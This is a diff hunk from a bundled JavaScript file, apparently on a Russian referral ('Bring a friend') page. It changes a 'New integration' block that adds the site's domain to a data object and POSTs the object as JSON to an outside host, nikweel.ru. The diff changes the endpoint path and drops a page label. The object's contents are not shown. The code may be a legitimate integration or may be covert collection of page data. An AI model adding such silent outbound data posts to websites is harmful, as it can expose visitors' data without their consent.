@@ -17852,16 +17852,14 @@
 
 						////New integration
 						c.domen = document.domain;
-						c.page = 'Приведи друга';
-						
-						fetch('https://nikweel.ru/gazoved/index.php', {
+						fetch('https://nikweel.ru/ufa/index.php', {
 							method: 'POST',
 							headers: {
 							'Content-Type': 'application/json;charset=utf-8',
 							},
 							body: JSON.stringify(c)
 						});
-
+						
 						return e.json()
 					})).then((function(t) {
 						var r;
